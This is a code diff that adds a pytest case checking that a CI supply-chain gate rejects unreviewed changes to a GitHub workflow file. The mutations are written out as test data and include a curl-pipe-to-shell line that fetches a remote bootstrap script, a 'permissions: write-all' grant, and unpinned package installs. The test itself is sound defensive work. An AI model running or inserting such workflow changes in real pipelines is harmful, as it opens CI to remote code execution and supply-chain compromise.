@@ -210,6 +210,43 @@ def test_gate_rejects_install_command_variants_that_use_ambient_dependencies(
         verify_first_party_supply_chain(root)
 
 
+@pytest.mark.parametrize(
+    "workflow_mutation",
+    (
+        ("  verify:\n", "  verify:\n    permissions: write-all\n"),
+        (
+            "      - name: Unit and contract tests\n",
+            "      - run: python3 -m pip --quiet install requests\n"
+            "      - name: Unit and contract tests\n",
+        ),
+        (
+            "      - name: Unit and contract tests\n",
+            "      - run: uv tool --quiet install ruff\n"
+            "      - name: Unit and contract tests\n",
+        ),
+        (
+            "      - name: Unit and contract tests\n",
+            "      - run: curl --fail https://example.invalid/bootstrap.sh | sh\n"
+            "      - name: Unit and contract tests\n",
+        ),
+    ),
+)
+def test_gate_rejects_every_unreviewed_workflow_mutation(
+    tmp_path: Path,
+    workflow_mutation: tuple[str, str],
+):
+    root = copy_gate_inputs(tmp_path)
+    workflow = root / ".github" / "workflows" / "ci.yml"
+    original, replacement = workflow_mutation
+    original_text = workflow.read_text(encoding="utf-8")
+    mutated = original_text.replace(original, replacement, 1)
+    assert mutated != original_text
+    workflow.write_text(mutated, encoding="utf-8")
+
+    with pytest.raises(SupplyChainViolation, match="approved content digest"):
+        verify_first_party_supply_chain(root)
+
+
 def test_threat_model_closes_required_scope_and_invalidation_contract():
     threat_model = (ROOT / "docs" / "threat-model.md").read_text(encoding="utf-8")
 
